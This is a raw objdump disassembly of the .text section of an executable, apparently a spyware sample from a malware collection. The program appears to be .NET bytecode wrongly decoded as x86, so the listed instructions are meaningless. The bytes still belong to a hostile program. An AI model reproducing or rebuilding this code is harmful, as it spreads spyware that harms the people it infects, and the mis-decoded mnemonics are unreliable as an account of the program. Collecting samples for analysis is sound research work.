
malware_samples/spyware/7ddb331b1930f9cd3fd7e6de43119db0bbcb20bf6d23b1fbb60db12b0d983c2f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f0 b6 00             	lock mov $0x0,%dh
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 c8 6c 00       	add    $0x6cc800,%eax
  402013:	00 f4                	add    %dh,%ah
  402015:	49                   	dec    %ecx
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	14 00                	adc    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 00                	sub    (%eax),%al
  40208b:	00 13                	add    %dl,(%ebx)
  40208d:	30 01                	xor    %al,(%ecx)
  40208f:	00 0f                	add    %cl,(%edi)
  402091:	00 00                	add    %al,(%eax)
  402093:	00 01                	add    %al,(%ecx)
  402095:	00 00                	add    %al,(%eax)
  402097:	11 7e 01             	adc    %edi,0x1(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	04 6f                	add    $0x6f,%al
  40209e:	0a 00                	or     (%eax),%al
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	0a 2b                	or     (%ebx),%ch
  4020a4:	00 06                	add    %al,(%esi)
  4020a6:	2a 00                	sub    (%eax),%al
  4020a8:	13 30                	adc    (%eax),%esi
  4020aa:	01 00                	add    %eax,(%eax)
  4020ac:	0f 00 00             	sldt   (%eax)
  4020af:	00 02                	add    %al,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	11 7e 02             	adc    %edi,0x2(%esi)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 6f                	add    $0x6f,%al
  4020ba:	0b 00                	or     (%eax),%eax
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	0a 2b                	or     (%ebx),%ch
  4020c0:	00 06                	add    %al,(%esi)
  4020c2:	2a 00                	sub    (%eax),%al
  4020c4:	13 30                	adc    (%eax),%esi
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	0f 00 00             	sldt   (%eax)
  4020cb:	00 03                	add    %al,(%ebx)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	11 7e 03             	adc    %edi,0x3(%esi)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	04 6f                	add    $0x6f,%al
  4020d6:	0c 00                	or     $0x0,%al
  4020d8:	00 0a                	add    %cl,(%edx)
  4020da:	0a 2b                	or     (%ebx),%ch
  4020dc:	00 06                	add    %al,(%esi)
  4020de:	2a 00                	sub    (%eax),%al
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	01 00                	add    %eax,(%eax)
  4020e4:	0f 00 00             	sldt   (%eax)
  4020e7:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ea:	00 11                	add    %dl,(%ecx)
  4020ec:	7e 04                	jle    0x4020f2
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 6f                	add    $0x6f,%al
  4020f2:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  4020f7:	2b 00                	sub    (%eax),%eax
  4020f9:	06                   	push   %es
  4020fa:	2a 00                	sub    (%eax),%al
  4020fc:	13 30                	adc    (%eax),%esi
  4020fe:	02 00                	add    (%eax),%al
  402100:	11 00                	adc    %eax,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	05 00 00 11 02       	add    $0x2110000,%eax
  402109:	03 28                	add    (%eax),%ebp
  40210b:	11 00                	adc    %eax,(%eax)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	28 12                	sub    %dl,(%edx)
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 0a                	or     (%edx),%cl
  402115:	2b 00                	sub    (%eax),%eax
  402117:	06                   	push   %es
  402118:	2a 00                	sub    (%eax),%al
  40211a:	00 00                	add    %al,(%eax)
  40211c:	13 30                	adc    (%eax),%esi
  40211e:	01 00                	add    %eax,(%eax)
  402120:	0b 00                	or     (%eax),%eax
  402122:	00 00                	add    %al,(%eax)
  402124:	06                   	push   %es
  402125:	00 00                	add    %al,(%eax)
  402127:	11 02                	adc    %eax,(%edx)
  402129:	28 13                	sub    %dl,(%ebx)
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 0a                	or     (%edx),%cl
  40212f:	2b 00                	sub    (%eax),%eax
  402131:	06                   	push   %es
  402132:	2a 00                	sub    (%eax),%al
  402134:	13 30                	adc    (%eax),%esi
  402136:	01 00                	add    %eax,(%eax)
  402138:	0f 00 00             	sldt   (%eax)
  40213b:	00 07                	add    %al,(%edi)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 d0                	adc    %edx,%eax
  402141:	05 00 00 02 28       	add    $0x28020000,%eax
  402146:	14 00                	adc    $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	0a 2b                	or     (%ebx),%ch
  40214c:	00 06                	add    %al,(%esi)
  40214e:	2a 00                	sub    (%eax),%al
  402150:	13 30                	adc    (%eax),%esi
  402152:	01 00                	add    %eax,(%eax)
  402154:	0b 00                	or     (%eax),%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	08 00                	or     %al,(%eax)
  40215a:	00 11                	add    %dl,(%ecx)
  40215c:	02 28                	add    (%eax),%ch
  40215e:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402163:	2b 00                	sub    (%eax),%eax
  402165:	06                   	push   %es
  402166:	2a 00                	sub    (%eax),%al
  402168:	13 30                	adc    (%eax),%esi
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	18 00                	sbb    %al,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	09 00                	or     %eax,(%eax)
  402172:	00 11                	add    %dl,(%ecx)
  402174:	02 8c 01 00 00 1b 2d 	add    0x2d1b0000(%ecx,%eax,1),%cl
  40217b:	0a 28                	or     (%eax),%ch
  40217d:	01 00                	add    %eax,(%eax)
  40217f:	00 2b                	add    %ch,(%ebx)
  402181:	0a 2b                	or     (%ebx),%ch
  402183:	06                   	push   %es
  402184:	2b 04 02             	sub    (%edx,%eax,1),%eax
  402187:	0a 2b                	or     (%ebx),%ch
  402189:	00 06                	add    %al,(%esi)
  40218b:	2a 13                	sub    (%ebx),%dl
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 10                	add    %dl,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 0a                	add    %cl,(%edx)
  402195:	00 00                	add    %al,(%eax)
  402197:	11 03                	adc    %eax,(%ebx)
  402199:	12 00                	adc    (%eax),%al
  40219b:	fe                   	(bad)
  40219c:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  4021a1:	06                   	push   %es
  4021a2:	81 02 00 00 1b 2a    	addl   $0x2a1b0000,(%edx)
  4021a8:	1e                   	push   %ds
  4021a9:	02 28                	add    (%eax),%ch
  4021ab:	17                   	pop    %ss
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a 2a                	or     (%edx),%ch
  4021b0:	13 30                	adc    (%eax),%esi
  4021b2:	01 00                	add    %eax,(%eax)
  4021b4:	20 00                	and    %al,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0b 00                	or     (%eax),%eax
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	7e 19                	jle    0x4021d7
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 8c 03 00 00 1b 2d 	or     0x2d1b0000(%ebx,%eax,1),%cl
  4021c7:	0a 28                	or     (%eax),%ch
  4021c9:	02 00                	add    (%eax),%al
  4021cb:	00 2b                	add    %ch,(%ebx)
  4021cd:	80 19 00             	sbbb   $0x0,(%ecx)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	7e 19                	jle    0x4021ed
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 0a                	or     (%edx),%cl
  4021d8:	2b 00                	sub    (%eax),%eax
  4021da:	06                   	push   %es
  4021db:	2a 1e                	sub    (%esi),%bl
  4021dd:	02 28                	add    (%eax),%ch
  4021df:	17                   	pop    %ss
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	0a 2a                	or     (%edx),%ch
  4021e4:	13 30                	adc    (%eax),%esi
  4021e6:	01 00                	add    %eax,(%eax)
  4021e8:	51                   	push   %ecx
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	00 72 01             	add    %dh,0x1(%edx)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 80                	jo     0x402176
  4021f6:	06                   	push   %es
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	04 72                	add    $0x72,%al
  4021fb:	1d 00 00 70 80       	sbb    $0x80700000,%eax
  402200:	07                   	pop    %es
  402201:	00 00                	add    %al,(%eax)
  402203:	04 72                	add    $0x72,%al
  402205:	27                   	daa
  402206:	00 00                	add    %al,(%eax)
  402208:	70 80                	jo     0x40218a
  40220a:	08 00                	or     %al,(%eax)
  40220c:	00 04 72             	add    %al,(%edx,%esi,2)
  40220f:	3f                   	aas
  402210:	00 00                	add    %al,(%eax)
  402212:	70 80                	jo     0x402194
  402214:	09 00                	or     %eax,(%eax)
  402216:	00 04 72             	add    %al,(%edx,%esi,2)
  402219:	53                   	push   %ebx
  40221a:	00 00                	add    %al,(%eax)
  40221c:	70 80                	jo     0x40219e
  40221e:	0a 00                	or     (%eax),%al
  402220:	00 04 72             	add    %al,(%edx,%esi,2)
  402223:	63 00                	arpl   %eax,(%eax)
  402225:	00 70 80             	add    %dh,-0x80(%eax)
  402228:	0b 00                	or     (%eax),%eax
  40222a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40222d:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402232:	1e                   	push   %ds
  402233:	00 00                	add    %al,(%eax)
  402235:	0a 6f 1f             	or     0x1f(%edi),%ch
  402238:	00 00                	add    %al,(%eax)
  40223a:	0a 80 0e 00 00 04    	or     0x400000e(%eax),%al
  402240:	2a 00                	sub    (%eax),%al
  402242:	00 00                	add    %al,(%eax)
  402244:	1e                   	push   %ds
  402245:	02 28                	add    (%eax),%ch
  402247:	17                   	pop    %ss
  402248:	00 00                	add    %al,(%eax)
  40224a:	0a 2a                	or     (%edx),%ch
  40224c:	1e                   	push   %ds
  40224d:	02 28                	add    (%eax),%ch
  40224f:	17                   	pop    %ss
  402250:	00 00                	add    %al,(%eax)
  402252:	0a 2a                	or     (%edx),%ch
  402254:	1b 30                	sbb    (%eax),%esi
  402256:	03 00                	add    (%eax),%eax
  402258:	7e 00                	jle    0x40225a
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0c 00                	or     $0x0,%al
  40225e:	00 11                	add    %dl,(%ecx)
  402260:	20 e8                	and    %ch,%al
  402262:	03 00                	add    (%eax),%eax
  402264:	00 28                	add    %ch,(%eax)
  402266:	21 00                	and    %eax,(%eax)
  402268:	00 0a                	add    %cl,(%edx)
  40226a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40226e:	06                   	push   %es
  40226f:	2d 06 16 28 22       	sub    $0x22281606,%eax
  402274:	00 00                	add    %al,(%eax)
  402276:	0a 1d 28 23 00 00    	or     0x2328,%bl
  40227c:	0a 72 85             	or     -0x7b(%edx),%dh
  40227f:	00 00                	add    %al,(%eax)
  402281:	70 7e                	jo     0x402301
  402283:	0e                   	push   %cs
  402284:	00 00                	add    %al,(%eax)
  402286:	04 28                	add    $0x28,%al
  402288:	24 00                	and    $0x0,%al
  40228a:	00 0a                	add    %cl,(%edx)
  40228c:	28 25 00 00 0a 0b    	sub    %ah,0xb0a0000
  402292:	7e 0e                	jle    0x4022a2
  402294:	00 00                	add    %al,(%eax)
  402296:	04 07                	add    $0x7,%al
  402298:	28 26                	sub    %ah,(%esi)
  40229a:	00 00                	add    %al,(%eax)
  40229c:	0a 07                	or     (%edi),%al
  40229e:	73 27                	jae    0x4022c7
  4022a0:	00 00                	add    %al,(%eax)
  4022a2:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4022a5:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4022ab:	28 00                	sub    %al,(%eax)
  4022ad:	00 0a                	add    %cl,(%edx)
  4022af:	de 0e                	fimuls (%esi)
  4022b1:	25 28 29 00 00       	and    $0x2928,%eax
  4022b6:	0a 0d 28 2a 00 00    	or     0x2a28,%cl
  4022bc:	0a de                	or     %dh,%bl
  4022be:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4022c1:	06                   	push   %es
  4022c2:	15 00 00 06 73       	adc    $0x73060000,%eax
  4022c7:	2b 00                	sub    (%eax),%eax
  4022c9:	00 0a                	add    %cl,(%edx)
  4022cb:	73 2c                	jae    0x4022f9
  4022cd:	00 00                	add    %al,(%eax)
  4022cf:	0a 0a                	or     (%edx),%cl
  4022d1:	06                   	push   %es
  4022d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d3:	2d 00 00 0a 06       	sub    $0x60a0000,%eax
  4022d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d9:	2e 00 00             	add    %al,%cs:(%eax)
  4022dc:	0a 2a                	or     (%edx),%ch
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	01 10                	add    %edx,(%eax)
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	00 00                	add    %al,(%eax)
  4022e6:	17                   	pop    %ss
  4022e7:	00 3a                	add    %bh,(%edx)
  4022e9:	51                   	push   %ecx
  4022ea:	00 0e                	add    %cl,(%esi)
  4022ec:	24 00                	and    $0x0,%al
  4022ee:	00 01                	add    %al,(%ecx)
  4022f0:	ee                   	out    %al,(%dx)
  4022f1:	2b 35 73 2f 00 00    	sub    0x2f73,%esi
  4022f7:	0a 20                	or     (%eax),%ah
  4022f9:	e8 03 00 00 20       	call   0x20402301
  4022fe:	88 13                	mov    %dl,(%ebx)
  402300:	00 00                	add    %al,(%eax)
  402302:	6f                   	outsl  %ds:(%esi),(%dx)
  402303:	30 00                	xor    %al,(%eax)
  402305:	00 0a                	add    %cl,(%edx)
  402307:	28 21                	sub    %ah,(%ecx)
  402309:	00 00                	add    %al,(%eax)
  40230b:	0a 7e 0f             	or     0xf(%esi),%bh
  40230e:	00 00                	add    %al,(%eax)
  402310:	04 2d                	add    $0x2d,%al
  402312:	0a 28                	or     (%eax),%ch
  402314:	1e                   	push   %ds
  402315:	00 00                	add    %al,(%eax)
  402317:	06                   	push   %es
  402318:	28 18                	sub    %bl,(%eax)
  40231a:	00 00                	add    %al,(%eax)
  40231c:	06                   	push   %es
  40231d:	7e 16                	jle    0x402335
  40231f:	00 00                	add    %al,(%eax)
  402321:	04 6f                	add    $0x6f,%al
  402323:	31 00                	xor    %eax,(%eax)
  402325:	00 0a                	add    %cl,(%edx)
  402327:	26 17                	es pop %ss
  402329:	2d c8 2a 13 30       	sub    $0x30132ac8,%eax
  40232e:	01 00                	add    %eax,(%eax)
  402330:	41                   	inc    %ecx
  402331:	00 00                	add    %al,(%eax)
  402333:	00 00                	add    %al,(%eax)
  402335:	00 00                	add    %al,(%eax)
  402337:	00 16                	add    %dl,(%esi)
  402339:	80 0f 00             	orb    $0x0,(%edi)
  40233c:	00 04 14             	add    %al,(%esp,%edx,1)
  40233f:	80 10 00             	adcb   $0x0,(%eax)
  402342:	00 04 16             	add    %al,(%esi,%edx,1)
  402345:	6a 80                	push   $0xffffff80
  402347:	11 00                	adc    %eax,(%eax)
  402349:	00 04 16             	add    %al,(%esi,%edx,1)
  40234c:	80 12 00             	adcb   $0x0,(%edx)
  40234f:	00 04 14             	add    %al,(%esp,%edx,1)
  402352:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  402356:	04 14                	add    $0x14,%al
  402358:	80 15 00 00 04 16 73 	adcb   $0x73,0x16040000
  40235f:	34 00                	xor    $0x0,%al
  402361:	00 0a                	add    %cl,(%edx)
  402363:	80 16 00             	adcb   $0x0,(%esi)
  402366:	00 04 14             	add    %al,(%esp,%edx,1)
  402369:	80 17 00             	adcb   $0x0,(%edi)
  40236c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40236f:	09 00                	or     %eax,(%eax)
  402371:	00 04 80             	add    %al,(%eax,%eax,4)
  402374:	18 00                	sbb    %al,(%eax)
  402376:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402379:	00 00                	add    %al,(%eax)
  40237b:	00 1e                	add    %bl,(%esi)
  40237d:	02 28                	add    (%eax),%ch
  40237f:	17                   	pop    %ss
  402380:	00 00                	add    %al,(%eax)
  402382:	0a 2a                	or     (%edx),%ch
  402384:	1b 30                	sbb    (%eax),%esi
  402386:	07                   	pop    %es
  402387:	00 0e                	add    %cl,(%esi)
  402389:	01 00                	add    %eax,(%eax)
  40238b:	00 0d 00 00 11 18    	add    %cl,0x18110000
  402391:	17                   	pop    %ss
  402392:	1c 73                	sbb    $0x73,%al
  402394:	35 00 00 0a 80       	xor    $0x800a0000,%eax
  402399:	10 00                	adc    %al,(%eax)
  40239b:	00 04 15 6a 80 11 00 	add    %al,0x11806a(,%edx,1)
  4023a2:	00 04 17             	add    %al,(%edi,%edx,1)
  4023a5:	8d 36                	lea    (%esi),%esi
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  4023af:	73 36                	jae    0x4023e7
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  4023b9:	7e 10                	jle    0x4023cb
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 20                	add    $0x20,%al
  4023bf:	00 c8                	add    %cl,%al
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023c4:	37                   	aaa
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	0a 7e 10             	or     0x10(%esi),%bh
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	04 20                	add    $0x20,%al
  4023ce:	00 c8                	add    %cl,%al
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d3:	38 00                	cmp    %al,(%eax)
  4023d5:	00 0a                	add    %cl,(%edx)
  4023d7:	7e 10                	jle    0x4023e9
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	04 7e                	add    $0x7e,%al
  4023dd:	06                   	push   %es
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	04 7e                	add    $0x7e,%al
  4023e2:	07                   	pop    %es
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	04 28                	add    $0x28,%al
  4023e7:	39 00                	cmp    %eax,(%eax)
  4023e9:	00 0a                	add    %cl,(%edx)
  4023eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ec:	3a 00                	cmp    (%eax),%al
  4023ee:	00 0a                	add    %cl,(%edx)
  4023f0:	17                   	pop    %ss
  4023f1:	80 0f 00             	orb    $0x0,(%edi)
  4023f4:	00 04 73             	add    %al,(%ebx,%esi,2)
  4023f7:	17                   	pop    %ss
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	0a 28                	or     (%eax),%ch
  4023fc:	11 00                	adc    %eax,(%eax)
  4023fe:	00 0a                	add    %cl,(%edx)
  402400:	80 17 00             	adcb   $0x0,(%edi)
  402403:	00 04 28             	add    %al,(%eax,%ebp,1)
  402406:	19 00                	sbb    %eax,(%eax)
  402408:	00 06                	add    %al,(%esi)
  40240a:	28 3b                	sub    %bh,(%ebx)
  40240c:	00 00                	add    %al,(%eax)
  40240e:	0a 28                	or     (%eax),%ch
  402410:	1c 00                	sbb    $0x0,%al
  402412:	00 06                	add    %al,(%esi)
  402414:	7e 10                	jle    0x402426
  402416:	00 00                	add    %al,(%eax)
  402418:	04 7e                	add    $0x7e,%al
  40241a:	13 00                	adc    (%eax),%eax
  40241c:	00 04 16             	add    %al,(%esi,%edx,1)
  40241f:	7e 13                	jle    0x402434
  402421:	00 00                	add    %al,(%eax)
  402423:	04 8e                	add    $0x8e,%al
  402425:	b7 16                	mov    $0x16,%bh
  402427:	14 fe                	adc    $0xfe,%al
  402429:	06                   	push   %es
  40242a:	1a 00                	sbb    (%eax),%al
  40242c:	00 06                	add    %al,(%esi)
  40242e:	73 3c                	jae    0x40246c
  402430:	00 00                	add    %al,(%eax)
  402432:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402435:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  40243a:	14 fe                	adc    $0xfe,%al
  40243c:	06                   	push   %es
  40243d:	20 00                	and    %al,(%eax)
  40243f:	00 06                	add    %al,(%esi)
  402441:	73 3e                	jae    0x402481
  402443:	00 00                	add    %al,(%eax)
  402445:	0a 0a                	or     (%edx),%cl
  402447:	06                   	push   %es
  402448:	14 73                	adc    $0x73,%al
  40244a:	2f                   	das
  40244b:	00 00                	add    %al,(%eax)
  40244d:	0a 20                	or     (%eax),%ah
  40244f:	10 27                	adc    %ah,(%edi)
  402451:	00 00                	add    %al,(%eax)
  402453:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402459:	30 00                	xor    %al,(%eax)
  40245b:	00 0a                	add    %cl,(%edx)
  40245d:	73 2f                	jae    0x40248e
  40245f:	00 00                	add    %al,(%eax)
  402461:	0a 20                	or     (%eax),%ah
  402463:	10 27                	adc    %ah,(%edi)
  402465:	00 00                	add    %al,(%eax)
  402467:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  40246d:	30 00                	xor    %al,(%eax)
  40246f:	00 0a                	add    %cl,(%edx)
  402471:	73 3f                	jae    0x4024b2
  402473:	00 00                	add    %al,(%eax)
  402475:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
  40247b:	de 20                	fisubs (%eax)
  40247d:	25 28 29 00 00       	and    $0x2928,%eax
  402482:	0a 0b                	or     (%ebx),%cl
  402484:	16                   	push   %ss
  402485:	80 0f 00             	orb    $0x0,(%edi)
  402488:	00 04 28             	add    %al,(%eax,%ebp,1)
  40248b:	2a 00                	sub    (%eax),%al
  40248d:	00 0a                	add    %cl,(%edx)
  40248f:	de 0c 7e             	fimuls (%esi,%edi,2)
  402492:	16                   	push   %ss
  402493:	00 00                	add    %al,(%eax)
  402495:	04 6f                	add    $0x6f,%al
  402497:	40                   	inc    %eax
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 26                	or     (%esi),%ah
  40249c:	dc 2a                	fsubrl (%edx)
  40249e:	00 00                	add    %al,(%eax)
  4024a0:	41                   	inc    %ecx
  4024a1:	34 00                	xor    $0x0,%al
	...
  4024ab:	00 ed                	add    %ch,%ch
  4024ad:	00 00                	add    %al,(%eax)
  4024af:	00 ed                	add    %ch,%ch
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4024b6:	00 00                	add    %al,(%eax)
  4024b8:	24 00                	and    $0x0,%al
  4024ba:	00 01                	add    %al,(%ecx)
  4024bc:	02 00                	add    (%eax),%al
  4024be:	00 00                	add    %al,(%eax)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	01 01                	add    %eax,(%ecx)
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	01 01                	add    %eax,(%ecx)
  4024ca:	00 00                	add    %al,(%eax)
  4024cc:	0c 00                	or     $0x0,%al
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	00 00                	add    %al,(%eax)
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	13 30                	adc    (%eax),%esi
  4024d6:	05 00 66 01 00       	add    $0x16600,%eax
  4024db:	00 0e                	add    %cl,(%esi)
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	11 73 41             	adc    %esi,0x41(%ebx)
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	0a 0b                	or     (%ebx),%cl
  4024e6:	1f                   	pop    %ds
  4024e7:	17                   	pop    %ss
  4024e8:	8d 03                	lea    (%ebx),%eax
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	01 0d 09 16 72 89    	add    %ecx,0x89721609
  4024f2:	00 00                	add    %al,(%eax)
  4024f4:	70 a2                	jo     0x402498
  4024f6:	09 17                	or     %edx,(%edi)
  4024f8:	7e 18                	jle    0x402512
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	04 28                	add    $0x28,%al
  4024fe:	11 00                	adc    %eax,(%eax)
  402500:	00 0a                	add    %cl,(%edx)
  402502:	a2 09 18 28 38       	mov    %al,0x38281809
  402507:	00 00                	add    %al,(%eax)
  402509:	06                   	push   %es
  40250a:	a2 09 19 7e 18       	mov    %al,0x187e1909
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 28                	add    $0x28,%al
  402513:	11 00                	adc    %eax,(%eax)
  402515:	00 0a                	add    %cl,(%edx)
  402517:	a2 09 1a 28 42       	mov    %al,0x42281a09
  40251c:	00 00                	add    %al,(%eax)
  40251e:	0a a2 09 1b 7e 18    	or     0x187e1b09(%edx),%ah
  402524:	00 00                	add    %al,(%eax)
  402526:	04 28                	add    $0x28,%al
  402528:	11 00                	adc    %eax,(%eax)
  40252a:	00 0a                	add    %cl,(%edx)
  40252c:	a2 09 1c 07 6f       	mov    %al,0x6f071c09
  402531:	43                   	inc    %ebx
  402532:	00 00                	add    %al,(%eax)
  402534:	0a 72 93             	or     -0x6d(%edx),%dh
  402537:	00 00                	add    %al,(%eax)
  402539:	70 14                	jo     0x40254f
  40253b:	6f                   	outsl  %ds:(%esi),(%dx)
  40253c:	44                   	inc    %esp
  40253d:	00 00                	add    %al,(%eax)
  40253f:	0a a2 09 1d 28 45    	or     0x45281d09(%edx),%ah
  402545:	00 00                	add    %al,(%eax)
  402547:	0a 6f 46             	or     0x46(%edi),%ch
  40254a:	00 00                	add    %al,(%eax)
  40254c:	0a 72 a7             	or     -0x59(%edx),%dh
  40254f:	00 00                	add    %al,(%eax)
  402551:	70 72                	jo     0x4025c5
  402553:	c1 00 00             	roll   $0x0,(%eax)
  402556:	70 6f                	jo     0x4025c7
  402558:	44                   	inc    %esp
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 72 c7             	or     -0x39(%edx),%dh
  40255e:	00 00                	add    %al,(%eax)
  402560:	70 28                	jo     0x40258a
  402562:	47                   	inc    %edi
  402563:	00 00                	add    %al,(%eax)
  402565:	0a a2 09 1e 28 48    	or     0x48281e09(%edx),%ah
  40256b:	00 00                	add    %al,(%eax)
  40256d:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402570:	02 28                	add    (%eax),%ch
  402572:	49                   	dec    %ecx
  402573:	00 00                	add    %al,(%eax)
  402575:	0a 72 cb             	or     -0x35(%edx),%dh
  402578:	00 00                	add    %al,(%eax)
  40257a:	70 72                	jo     0x4025ee
  40257c:	d7                   	xlat   %ds:(%ebx)
  40257d:	00 00                	add    %al,(%eax)
  40257f:	70 6f                	jo     0x4025f0
  402581:	44                   	inc    %esp
  402582:	00 00                	add    %al,(%eax)
  402584:	0a 72 e3             	or     -0x1d(%edx),%dh
  402587:	00 00                	add    %al,(%eax)
  402589:	70 72                	jo     0x4025fd
  40258b:	ed                   	in     (%dx),%eax
  40258c:	00 00                	add    %al,(%eax)
  40258e:	70 6f                	jo     0x4025ff
  402590:	44                   	inc    %esp
  402591:	00 00                	add    %al,(%eax)
  402593:	0a a2 09 1f 09 7e    	or     0x7e091f09(%edx),%ah
  402599:	18 00                	sbb    %al,(%eax)
  40259b:	00 04 28             	add    %al,(%eax,%ebp,1)
  40259e:	11 00                	adc    %eax,(%eax)
  4025a0:	00 0a                	add    %cl,(%edx)
  4025a2:	a2 09 1f 0a 72       	mov    %al,0x720a1f09
  4025a7:	f9                   	stc
  4025a8:	00 00                	add    %al,(%eax)
  4025aa:	70 a2                	jo     0x40254e
  4025ac:	09 1f                	or     %ebx,(%edi)
  4025ae:	0b 7e 18             	or     0x18(%esi),%edi
  4025b1:	00 00                	add    %al,(%eax)
  4025b3:	04 28                	add    $0x28,%al
  4025b5:	11 00                	adc    %eax,(%eax)
  4025b7:	00 0a                	add    %cl,(%edx)
  4025b9:	a2 09 1f 0c 28       	mov    %al,0x280c1f09
  4025be:	3f                   	aas
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	06                   	push   %es
  4025c2:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  4025c7:	18 00                	sbb    %al,(%eax)
  4025c9:	00 04 28             	add    %al,(%eax,%ebp,1)
  4025cc:	11 00                	adc    %eax,(%eax)
  4025ce:	00 0a                	add    %cl,(%edx)
